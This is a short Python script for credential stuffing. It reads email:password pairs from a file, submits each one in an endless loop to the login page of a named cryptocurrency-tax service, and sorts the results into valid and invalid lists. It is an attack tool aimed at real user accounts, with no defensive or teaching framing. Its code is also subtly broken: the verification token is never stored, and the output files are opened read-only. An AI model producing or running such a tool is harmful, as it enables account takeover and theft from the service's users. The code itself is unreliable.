import requests
from styling import Colors
from bs4 import BeautifulSoup

while True:
  with open("logins.txt") as f:
    for login in f:
        print(Colors.blue + f"Trying {login}")
        login = login.rstrip().split(":")
        requests.get("https://auth.coinledger.io/Login", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:105.0) Gecko/20100101 Firefox/105.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"}).text.split("""<input name="__RequestVerificationToken" type="hidden" value=""", '" />')[0]
        r = requests.post("https://auth.coinledger.io/Login", 
            text=f"""ReturnUrl=&Input.Email={login[0]}&Input.Password={login[1]}&Input.KeepMeLoggedIn=true&__RequestVerificationToken={v}&Input.KeepMeLoggedIn=false"""
        ).status_code
        if r == 200:
            with open("valid.txt") as fr:
                fr.write(login[0] + login[1])
                print(Colors.green + login[0] + login[1])
        else:
            with open("invalid.txt") as fr:
                fr.write(login[0] + login[1])
                print(Colors.red + login[0] + login[1])
